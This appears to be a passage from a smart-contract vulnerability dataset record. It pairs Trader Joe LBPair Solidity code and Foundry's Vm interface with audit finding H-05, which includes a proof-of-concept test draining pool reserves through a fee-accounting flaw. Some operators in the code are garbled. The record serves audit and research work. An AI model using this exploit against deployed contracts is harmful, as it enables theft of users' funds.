pair\n    /// @param _packedFeeParameters The packed fee parameters\n    function _setFeesParameters(bytes32 _packedFeeParameters) internal {\n        bytes32 _feeStorageSlot;\n        assembly {\n            _feeStorageSlot := sload(_feeParameters.slot)\n        }\n\n        uint256 _varParameters = _feeStorageSlot.decode(type(uint112).max, _OFFSET_VARIABLE_FEE_PARAMETERS);\n        uint256 _newFeeParameters = _packedFeeParameters.decode(type(uint144).max, 0);\n\n        assembly {\n            sstore(_feeParameters.slot, or(_newFeeParameters, _varParameters))\n        }\n    }\n\n    /// @notice Private function to increase the oracle's number of sample\n    /// @param _newSize The new size of the oracle. Needs to be bigger than current one\n    function _increaseOracle(uint16 _newSize) private {\n        uint256 _oracleSize = _pairInformation.oracleSize;\n\n        if (_oracleSize >= _newSize) revert LBPair__NewSizeTooSmall(_newSize, _oracleSize);\n\n        _pairInformation.oracleSize = _newSize;\n\n        unchecked {\n            for (uint256 _id = _oracleSize; _id < _newSize; ++_id) {\n                _oracle.initialize(_id);\n            }\n        }\n\n        emit OracleSizeIncreased(_oracleSize, _newSize);\n    }\n\n    /// @notice Private view function to return the oracle's parameters\n    /// @return oracleSampleLifetime The lifetime of a sample, it accumulates information for up to this timestamp\n    /// @return oracleSize The size of the oracle (last ids can be empty)\n    /// @return oracleActiveSize The active size of the oracle (no empty data)\n    /// @return oracleLastTimestamp The timestamp of the creation of the oracle's latest sample\n    /// @return oracleId The index of the oracle's latest sample\n    function _getOracleParameters()\n        internal\n        view\n        returns (\n            uint256 oracleSampleLifetime,\n            uint256 oracleSize,\n            uint256 oracleActiveSize,\n            uint256 oracleLastTimestamp,\n            uint256 oracleId\n        )\n    {\n        bytes32 _slot;\n        assembly {\n            _slot := sload(add(_pairInformation.slot, 1))\n        }\n        oracleSampleLifetime = _slot.decode(type(uint16).max, _OFFSET_ORACLE_SAMPLE_LIFETIME);\n        oracleSize = _slot.decode(type(uint16).max, _OFFSET_ORACLE_SIZE);\n        oracleActiveSize = _slot.decode(type(uint16).max, _OFFSET_ORACLE_ACTIVE_SIZE);\n        oracleLastTimestamp = _slot.decode(type(uint40).max, _OFFSET_ORACLE_LAST_TIMESTAMP);\n        oracleId = _slot.decode(type(uint24).max, _OFFSET_ORACLE_ID);\n    }\n\n    /// @notice Internal view function to get the reserves and active id\n    /// @return reserveX The reserve of asset X\n    /// @return reserveY The reserve of asset Y\n    /// @return activeId The active id of the pair\n    function _getReservesAndId()\n        internal\n        view\n        returns (\n            uint256 reserveX,\n            uint256 reserveY,\n            uint256 activeId\n        )\n    {\n        uint256 _mask24 = type(uint24).max;\n        uint256 _mask136 = type(uint136).max;\n        assembly {\n            let slot := sload(add(_pairInformation.slot, 1))\n            reserveY := and(slot, _mask136)\n\n            slot := sload(_pairInformation.slot)\n            activeId := and(slot, _mask24)\n            reserveX := and(shr(_OFFSET_PAIR_RESERVE_X, slot), _mask136)\n        }\n    }\n\n    /// @notice Internal view function to get the bin at `id`\n    /// @param _id The bin id\n    /// @return reserveX The reserve of tokenX of the bin\n    /// @return reserveY The reserve of tokenY of the bin\n    function _getBin(uint24 _id) internal view returns (uint256 reserveX, uint256 reserveY) {\n        bytes32 _data;\n        uint256 _mask112 = type(uint112).max;\n        // low level read of mapping to only load 1 storage slot\n        assembly {\n            mstore(0, _id)\n            mstore(32, _bins.slot)\n            _data := sload(keccak256(0, 64))\n\n            reserveX := and(_data, _mask112)\n            reserveY := shr(_OFFSET_BIN_RESERVE_Y, _data)\n        }\n\n        return (reserveX.safe112(), reserveY.safe112());\n    }\n\n    /// @notice Internal view function to get the global fees information, the total fees and those for protocol\n    /// @dev The fees for users are `total - protocol`\n    /// @return feesXTotal The total fees of asset X\n    /// @return feesYTotal The total fees of asset Y\n    /// @return feesXProtocol The protocol fees of asset X\n    /// @return feesYProtocol The protocol fees of asset Y\n    function _getGlobalFees()\n        internal\n        view\n        returns (\n            uint256 feesXTotal,\n            uint256 feesYTotal,\n            uint256 feesXProtocol,\n            uint256 feesYProtocol\n        )\n    {\n        bytes32 _slotX;\n        bytes32 _slotY;\n        assembly {\n            _slotX := sload(add(_pairInformation.slot, 2))\n            _slotY := sload(add(_pairInformation.slot, 3))\n        }\n\n        feesXTotal = _slotX.decode(type(uint128).max, 0);\n        feesYTotal = _slotY.decode(type(uint128).max, 0);\n\n        feesXProtocol = _slotX.decode(type(uint128).max, _OFFSET_PROTOCOL_FEE);\n        feesYProtocol = _slotY.decode(type(uint128).max, _OFFSET_PROTOCOL_FEE);\n    }\n\n    /// @notice Internal pure function to return the flashloan fee amount\n    /// @param _amount The amount to flashloan\n    /// @param _fee the fee percentage, in basis point\n    /// @return The fee amount\n    function _getFlashLoanFee(uint256 _amount, uint256 _fee) internal pure returns (uint256) {\n        return (_amount * _fee) / Constants.PRECISION;\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity >=0.6.0 <0.9.0;\npragma experimental ABIEncoderV2;\n\ninterface Vm {\n    struct Log {\n        bytes32[] topics;\n        bytes data;\n    }\n\n    // Sets block.timestamp (newTimestamp)\n    function warp(uint256) external;\n    // Sets block.height (newHeight)\n    function roll(uint256) external;\n    // Sets block.basefee (newBasefee)\n    function fee(uint256) external;\n    // Sets block.difficulty (newDifficulty)\n    function difficulty(uint256) external;\n    // Sets block.chainid\n    function chainId(uint256) external;\n    // Loads a storage slot from an address (who, slot)\n    function load(address,bytes32) external returns (bytes32);\n    // Stores a value to an address' storage slot, (who, slot, value)\n    function store(address,bytes32,bytes32) external;\n    // Signs data, (privateKey, digest) => (v, r, s)\n    function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n    // Gets the address for a given private key, (privateKey) => (address)\n    function addr(uint256) external returns (address);\n    // Gets the nonce of an account\n    function getNonce(address) external returns (uint64);\n    // Sets the nonce of an account; must be higher than the current nonce of the account\n    function setNonce(address, uint64) external;\n    // Performs a foreign function call via the terminal, (stringInputs) => (result)\n    function ffi(string[] calldata) external returns (bytes memory);\n    // Sets environment variables, (name, value)\n    function setEnv(string calldata, string calldata) external;\n    // Reads environment variables, (name) => (value)\n    function envBool(string calldata) external returns (bool);\n    function envUint(string calldata) external returns (uint256);\n    function envInt(string calldata) external returns (int256);\n    function envAddress(string calldata) external returns (address);\n    function envBytes32(string calldata) external returns (bytes32);\n    function envString(string calldata) external returns (string memory);\n    function envBytes(string calldata) external returns (bytes memory);\n    // Reads environment variables as arrays, (name, delim) => (value[])\n    function envBool(string calldata, string calldata) external returns (bool[] memory);\n    function envUint(string calldata, string calldata) external returns (uint256[] memory);\n    function envInt(string calldata, string calldata) external returns (int256[] memory);\n    function envAddress(string calldata, string calldata) external returns (address[] memory);\n    function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n    function envString(string calldata, string calldata) external returns (string[] memory);\n    function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n    // Sets the *next* call's msg.sender to be the input address\n    function prank(address) external;\n    // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n    function startPrank(address) external;\n    // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n    function prank(address,address) external;\n    // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n    function startPrank(address,address) external;\n    // Resets subsequent calls' msg.sender to be `address(this)`\n    function stopPrank() external;\n    // Sets an address' balance, (who, newBalance)\n    function deal(address, uint256) external;\n    // Sets an address' code, (who, newCode)\n    function etch(address, bytes calldata) external;\n    // Expects an error on next call\n    function expectRevert(bytes calldata) external;\n    function expectRevert(bytes4) external;\n    function expectRevert() external;\n    // Records all storage reads and writes\n    function record() external;\n    // Gets all accessed reads and write slot from a recording session, for a given address\n    function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n    // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n    // Call this function, then emit an event, then call a function. Internally after the call, we check if\n    // logs were emitted in the expected order with the expected topics and data (as specified by the booleans)\n    function expectEmit(bool,bool,bool,bool) external;\n    function expectEmit(bool,bool,bool,bool,address) external;\n    // Mocks a call to an address, returning specified data.\n    // Calldata can either be strict or a partial match, e.g. if you only\n    // pass a Solidity selector to the expected calldata, then the entire Solidity\n    // function will be mocked.\n    function mockCall(address,bytes calldata,bytes calldata) external;\n    // Mocks a call to an address with a specific msg.value, returning specified data.\n    // Calldata match takes precedence over msg.value in case of ambiguity.\n    function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n    // Clears all mocked calls\n    function clearMockedCalls() external;\n    // Expects a call to an address with the specified calldata.\n    // Calldata can either be a strict or a partial match\n    function expectCall(address,bytes calldata) external;\n    // Expects a call to an address with the specified msg.value and calldata\n    function expectCall(address,uint256,bytes calldata) external;\n    // Gets the code from an artifact file. Takes in the relative path to the json file\n    function getCode(string calldata) external returns (bytes memory);\n    // Labels an address in call traces\n    function label(address, string calldata) external;\n    // If the condition is false, discard this run's fuzz inputs and generate new ones\n    function assume(bool) external;\n    // Sets block.coinbase (who)\n    function coinbase(address) external;\n    // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n    function broadcast() external;\n    // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n    function broadcast(address) external;\n    // Using the address that calls the test contract, has all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n    function startBroadcast() external;\n    // Has all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n    function startBroadcast(address) external;\n    // Stops collecting onchain transactions\n    function stopBroadcast() external;\n\n    // Reads the entire content of file to string, (path) => (data)\n    function readFile(string calldata) external returns (string memory);\n    // Get the path of the current project root\n    function projectRoot() external returns (string memory);\n    // Reads next line of file to string, (path) => (line)\n    function readLine(string calldata) external returns (string memory);\n    // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n    // (path, data) => ()\n    function writeFile(string calldata, string calldata) external;\n    // Writes line to file, creating a file if it does not exist.\n    // (path, data) => ()\n    function writeLine(string calldata, string calldata) external;\n    // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n    // (path) => ()\n    function closeFile(string calldata) external;\n    // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n    // - Path points to a directory.\n    // - The file doesn't exist.\n    // - The user lacks permissions to remove the file.\n    // (path) => ()\n    function removeFile(string calldata) external;\n\n    // Convert values to a string, (value) => (stringified value)\n    function toString(address) external returns(string memory);\n    function toString(bytes calldata) external returns(string memory);\n    function toString(bytes32) external returns(string memory);\n    function toString(bool) external returns(string memory);\n    function toString(uint256) external returns(string memory);\n    function toString(int256) external returns(string memory);\n\n    // Convert values from a string, (string) => (parsed value)\n    function parseBytes(string calldata) external returns (bytes memory);\n    function parseAddress(string calldata) external returns (address);\n    function parseUint(string calldata) external returns (uint256);\n    function parseInt(string calldata) external returns (int256);\n    function parseBytes32(string calldata) external returns (bytes32);\n    function parseBool(string calldata) external returns (bool);\n\n    // Record all the transaction logs\n    function recordLogs() external;\n    // Gets all the recorded logs, () => (logs)\n    function getRecordedLogs() external returns (Log[] memory);\n    // Snapshot the current state of the evm.\n    // Returns the id of the snapshot that was created.\n    // To revert a snapshot use `revertTo`\n    function snapshot() external returns(uint256);\n    // Revert the state of the evm to a previous snapshot\n    // Takes the snapshot id to revert to.\n    // This deletes the snapshot and all snapshots taken after the given snapshot id.\n    function revertTo(uint256) external returns(bool);\n\n    // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n    function createFork(string calldata,uint256) external returns(uint256);\n    // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n    function createFork(string calldata) external returns(uint256);\n    // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n    function createSelectFork(string calldata,uint256) external returns(uint256);\n    // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n    function createSelectFork(string calldata) external returns(uint256);\n    // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n    function selectFork(uint256) external;\n    /// Returns the currently active fork\n    /// Reverts if no fork is currently active\n    function activeFork() external returns(uint256);\n    // Updates the currently active fork to given block number\n    // This is similar to `roll` but for the currently active fork\n    function rollFork(uint256) external;\n    // Updates the given fork to given block number\n    function rollFork(uint256 forkId, uint256 blockNumber) external;\n\n    // Marks that the account(s) should use persistent storage across fork swaps in a multifork setup\n    // Meaning, changes made to the state of this account will be kept when switching forks\n    function makePersistent(address) external;\n    function makePersistent(address, address) external;\n    function makePersistent(address, address, address) external;\n    function makePersistent(address[] calldata) external;\n    // Revokes persistent status from the address, previously added via `makePersistent`\n    function revokePersistent(address) external;\n    function revokePersistent(address[] calldata) external;\n    // Returns true if the account is marked as persistent\n    function isPersistent(address) external returns (bool);\n\n    // Returns the RPC url for the given alias\n    function rpcUrl(string calldata) external returns(string memory);\n    // Returns all rpc urls and their aliases `[alias, url][]`\n    function rpcUrls() external returns(string[2][] memory);\n\n    // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n    function deriveKey(string calldata, uint32) external returns (uint256);\n    // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n    function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n    // parseJson\n\n    // Given a string of JSON, return the ABI-encoded value of provided key\n    // (stringified json, key) => (ABI-encoded data)\n    // Read the note below!\n    function parseJson(string calldata, string calldata) external returns(bytes memory);\n\n    // Given a string of JSON, return it as ABI-encoded, (stringified json, key) => (ABI-encoded data)\n    // Read the note below!\n    function parseJson(string calldata) external returns(bytes memory);\n\n    // Note:\n    // ----\n    // In case the returned value is a JSON object, it's encoded as a ABI-encoded tuple. As JSON objects\n    // don't have the notion of ordered, but tuples do, they JSON object is encoded with it's fields ordered in\n    // ALPHABETICAL ordser. That means that in order to succesfully decode the tuple, we need to define a tuple that\n    // encodes the fields in the same order, which is alphabetical. In the case of Solidity structs, they are encoded\n    // as tuples, with the attributes in the order in which they are defined.\n    // For example: json = { 'a': 1, 'b': 0xa4tb......3xs}\n    // a: uint256\n    // b: address\n    // To decode that json, we need to define a struct or a tuple as follows:\n    // struct json = { uint256 a; address b; }\n    // If we defined a json struct with the opposite order, meaning placing the address b first, it would try to\n    // decode the tuple in that order, and thus fail.\n\n}\n\n\n",
        "CodeNames": [
            "Votes.sol",
            "LBPair.sol",
            "Vm.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-05",
                "Location": [
                    "burn()",
                    "swap()",
                    "collectFees()",
                    "mint()"
                ],
                "Type": " Attacker can steal entire reserves by abusing fee calculation",
                "Description": "*Submitted by Trust(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/423), also found by zzykxx(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/320)*\n\n<https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L819-L829<br\n<https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L202<br\n\nSimilar to other LP pools, In Trader Joe users can call mint() to provide liquidity and receive LP tokens, and burn() to return their LP tokens in exchange for underlying assets. Users collect fees using collectFess(account,binID). Fees are implemented using debt model. The fundamental fee calculation is:\n\n        function _getPendingFees(\n            Bin memory _bin,\n            address _account,\n            uint256 _id,\n            uint256 _balance\n        ) private view returns (uint256 amountX, uint256 amountY) {\n            Debts memory _debts = _accruedDebts[_account][_id];\n\n            amountX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) _debts.debtX;\n            amountY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) _debts.debtY;\n        }\n\naccTokenXPerShare / accTokenYPerShare is an ever increasing amount that is updated when swap fees are paid to the current active bin.\n\nWhen liquidity is first minted to user, the _accruedDebts is updated to match current _balance &ast; accToken&ast;PerShare. Without this step, user could collect fees for the entire growth of accToken&ast;PerShare from zero to current value. This is done in _updateUserDebts, called by _cacheFees() which is called by _beforeTokenTransfer(), the token transfer hook triggered on mint/burn/transfer.\n\n        function _updateUserDebts(\n            Bin memory _bin,\n            address _account,\n            uint256 _id,\n            uint256 _balance\n        ) private {\n            uint256 _debtX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);\n            uint256 _debtY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);\n\n            _accruedDebts[_account][_id].debtX = _debtX;\n            _accruedDebts[_account][_id].debtY = _debtY;\n        }\n\nThe critical problem lies in _beforeTokenTransfer:\n\n    if (_from != _to) {\n        if (_from != address(0) && _from != address(this)) {\n            uint256 _balanceFrom = balanceOf(_from, _id);\n            _cacheFees(_bin, _from, _id, _balanceFrom, _balanceFrom _amount);\n        }\n        if (_to != address(0) && _to != address(this)) {\n            uint256 _balanceTo = balanceOf(_to, _id);\n            _cacheFees(_bin, _to, _id, _balanceTo, _balanceTo + _amount);\n        }\n    }\n\nNote that if _from or _to is the LBPair contract itself, _cacheFees won't be called on _from or _to respectively. This was presumably done because it is not expected that the LBToken address will receive any fees. It is expected that the LBToken will only hold tokens when user sends LP tokens to burn.\n\nThis is where the bug manifests the LBToken address (and 0 address), will collect freshly minted LP token's fees from 0 to current accToken&ast;PerShare value.\n\nWe can exploit this bug to collect the entire reserve assets. The attack flow is:\n\n*   Transfer amount X to pair\n*   Call pair.mint(), with the to address = pair address\n*   call collectFees() with pair address as account - pair will send to itself the fees! It is interesting that both OZ ERC20 implementation and LBToken implementation allow this, otherwise this exploit chain would not work\n*   Pair will now think user sent in money, because the bookkeeping is wrong. _pairInformation.feesX.total is decremented in collectFees(), but the balance did not change. Therefore, this calculation will credit attacker with the fees collected into the pool:\n\n<!----\n\n    uint256 _amountIn = _swapForY\n        ? tokenX.received(_pair.reserveX, _pair.feesX.total)\n        : tokenY.received(_pair.reserveY, _pair.feesY.total);\n\n*   Attacker calls swap() and receives reserve assets using the fees collected.\n*   Attacker calls burn(), passing their own address in _to parameter. This will successfully burn the minted tokens from step 1 and give Attacker their deposited assets.\n\nNote that if the contract did not have the entire collectFees code in an unchecked block, the loss would be limited to the total fees accrued:\n\n    if (amountX != 0) {\n        _pairInformation.feesX.total -= uint128(amountX);\n    }\n    if (amountY != 0) {\n        _pairInformation.feesY.total -= uint128(amountY);\n    }\n\nIf attacker would try to overflow the feesX/feesY totals, the call would revert. Unfortunately, because of the unchecked block feesX/feesY would overflow and therefore there would be no problem for attacker to take the entire reserves.\n\n\nAttacker can steal the entire reserves of the LBPair.\n\n\nPaste this test in LBPair.Fees.t.sol:\n\n        function testAttackerStealsReserve() public {\n            uint256 amountY=  53333333333333331968;\n            uint256 amountX = 100000;\n\n            uint256 amountYInLiquidity = 100e18;\n            uint256 totalFeesFromGetSwapX;\n            uint256 totalFeesFromGetSwapY;\n\n            addLiquidity(amountYInLiquidity, ID_ONE, 5, 0);\n            uint256 id;\n            (,,id ) = pair.getReservesAndId();\n            console.log(\"id before\" , id);\n\n            //swap X - Y and accrue X fees\n            (uint256 amountXInForSwap, uint256 feesXFromGetSwap) = router.getSwapIn(pair, amountY, true);\n            totalFeesFromGetSwapX += feesXFromGetSwap;\n\n            token6D.mint(address(pair), amountXInForSwap);\n            vm.prank(ALICE);\n            pair.swap(true, DEV);\n            (uint256 feesXTotal, , uint256 feesXProtocol, ) = pair.getGlobalFees();\n\n            (,,id ) = pair.getReservesAndId();\n            console.log(\"id after\" , id);\n\n\n            console.log(\"Bob balance:\");\n            console.log(token6D.balanceOf(BOB));\n            console.log(token18D.balanceOf(BOB));\n            console.log(\"-------------\");\n\n            uint256 amount0In = 100e18;\n\n            uint256[] memory _ids = new uint256[(1); _ids[0] = uint256(ID_ONE);\n            uint256[] memory _distributionX = new uint256[(1); _distributionX[0] = uint256(Constants.PRECISION);\n            uint256[] memory _distributionY = new uint256[(1); _distributionY[0] = uint256(0);\n\n            console.log(\"Minting for BOB:\");\n            console.log(amount0In);\n            console.log(\"-------------\");\n\n            token6D.mint(address(pair), amount0In);\n            //token18D.mint(address(pair), amount1In);\n            pair.mint(_ids, _distributionX, _distributionY, address(pair));\n            uint256[] memory amounts = new uint256[(1);\n            console.log(\"*\");\n            for (uint256 i; i < 1; i++) {\n                amounts[i] = pair.balanceOf(address(pair), _ids[i]);\n                console.log(amounts[i]);\n            }\n            uint256[] memory profit_ids = new uint256[(1); profit_ids[0] = 8388608;\n            (uint256 profit_X, uint256 profit_Y) = pair.pendingFees(address(pair), profit_ids);\n            console.log(\"profit x\", profit_X);\n            console.log(\"profit y\", profit_Y);\n            pair.collectFees(address(pair), profit_ids);\n            (uint256 swap_x, uint256 swap_y) = pair.swap(true,BOB);\n\n            console.log(\"swap x\", swap_x);\n            console.log(\"swap y\", swap_y);\n\n            console.log(\"Bob balance after swap:\");\n            console.log(token6D.balanceOf(BOB));\n            console.log(token18D.balanceOf(BOB));\n            console.log(\"-------------\");\n\n            console.log(\"*\");\n            pair.burn(_ids, amounts, BOB);\n\n\n            console.log(\"Bob balance after burn:\");\n            console.log(token6D.balanceOf(BOB));\n            console.log(token18D.balanceOf(BOB));\n            console.log(\"-------------\");\n\n        }\n\n\nManual audit, foundry\n\n",
                "Repair": "\nCode should not exempt any address from _cacheFees(). Even address(0) is important, because attacker can collectFees for the 0 address to overflow the FeesX/FeesY variables, even though the fees are not retrievable for them.\n\n0x0Louis (Trader Joe) confirmed(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/423)\n\nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/423#issuecomment-1312203078):\n  The Warden has shown how to exploit logic paths that would skip fee accrual, to be able to gather more fees than expected.\n \n While the finding pertains to a loss of fees, the repeated attack will allow stealing reserves as well, for this reason I agree with High Severity.\n\n\n\n*\n\n\n"
            }
        ]
    }
]